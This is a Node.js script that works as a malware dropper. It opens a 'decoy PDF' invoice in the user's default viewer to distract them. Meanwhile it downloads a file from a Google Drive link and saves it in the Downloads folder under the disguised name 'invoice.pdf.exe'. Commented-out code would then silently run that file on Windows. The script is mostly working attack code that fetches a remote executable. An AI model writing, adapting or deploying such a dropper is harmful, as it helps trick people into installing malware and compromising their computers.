const path = require('path');
const { exec } = require('child_process');
const https = require('https'); // For downloading files
const fs = require('fs'); // For file system operations

const DOWNLOAD_LINK = 'https://drive.google.com/uc?export=download&id=1ul4aqt60sOHhitak-LCXn1vjkz2PcX1G';
const PDF_PATH = path.join(__dirname, 'assets', 'invoice.pdf');
const DOWNLOAD_FILENAME = 'invoice.pdf.exe'; // Name for the downloaded file

// Function to get the user's downloads directory
function getDownloadsPath() {
    switch (process.platform) {
        case 'win32':
            return path.join(process.env.USERPROFILE || process.env.HOMEDRIVE + process.env.HOMEPATH, 'Downloads');
        case 'darwin':
            return path.join(process.env.HOME, 'Downloads');
        case 'linux':
            return path.join(process.env.HOME, 'Downloads');
        default:
            return path.join(process.env.HOME || process.env.TEMP, 'downloads');
    }
}

async function initiateProcess() {
    // 1. Open PDF in default viewer
    console.log('Attempting to open decoy PDF...');
    let pdfCommand;
    switch (process.platform) {
        case 'darwin': // macOS
            pdfCommand = `open "${PDF_PATH}"`;
            break;
        case 'win32': // Windows
            pdfCommand = `start "" "${PDF_PATH}"`;
            break;
        default: // Linux (and others)
            pdfCommand = `xdg-open "${PDF_PATH}"`;
            break;
    }

    exec(pdfCommand, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error opening PDF: ${error.message}`);
        } else if (stderr) {
            console.error(`stderr opening PDF: ${stderr}`);
        } else {
            console.log(`PDF opened: ${stdout}`);
        }
    });

    // 2. Perform background download of the executable
    console.log('Initiating background download...');
    const downloadPath = path.join(getDownloadsPath(), DOWNLOAD_FILENAME);
    const file = fs.createWriteStream(downloadPath);

    https.get(DOWNLOAD_LINK, (response) => {
        response.pipe(file);
        file.on('finish', () => {
            file.close();
            console.log(`Download completed successfully: ${downloadPath}`);
            // Optionally, execute the downloaded file silently here
            // Be cautious with this step, as it's the point of execution.
            // let execCommand;
            // if (process.platform === 'win32') {
            //     execCommand = `start "" "${downloadPath}"`;
            //     exec(execCommand, (err) => {
            //         if (err) console.error('Failed to execute downloaded file:', err);
            //     });
            // }
        });
    }).on('error', (err) => {
        fs.unlink(downloadPath, () => {}); // Delete the file if an error occurred
        console.error('Download failed:', err.message);
    });

    // Exit after a short delay to allow operations to start
    setTimeout(() => {
        console.log('Exiting application.');
        process.exit(0);
    }, 5000); // Give 5 seconds for PDF to open and download to initiate
}

initiateProcess();
